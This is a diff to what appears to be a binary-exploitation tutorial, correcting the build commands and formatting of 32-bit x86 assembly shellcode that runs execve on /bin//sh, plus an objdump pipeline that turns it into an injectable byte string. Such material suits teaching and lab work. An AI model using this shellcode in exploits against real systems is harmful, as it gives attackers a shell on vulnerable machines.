@@ -78,23 +78,23 @@ Segmentation fault
 
 ```bash
 $ cat shell32.s
-; nasm -f elf shell32.s -o shell32.o
+; nasm -f elf32 shell32.s -o shell32.o
 ; ld -m elf_i386 -s shell32.o -o shell32
-; echo "\"$(objdump -d ./shell | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
+; echo "\"$(objdump -d ./shell32 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
 
 
 section .text
     global _start
 
 _start:
-    xor eax, eax; safe null
-    push eax; push null byte onto stack
-    push 0x68732f2f ; push /bin//sh
+    xor eax,eax		; safe null
+    push eax		; push null byte onto stack
+    push 0x68732f2f 	; push /bin//sh
     push 0x6e69622f
-    mov ebx,esp ; set ebx to out cmd
-    mov ecx, eax; no args
-    mov edx, eax ; no args again
-    mov al, 0xb ; set sys_execve
+    mov ebx,esp		; set ebx to out cmd
+    mov ecx,eax		; no args
+    mov edx,eax		; no args again
+    mov al,0xb		; set sys_execve
     int 0x80
 user@pwn:/pwn/shell$
 
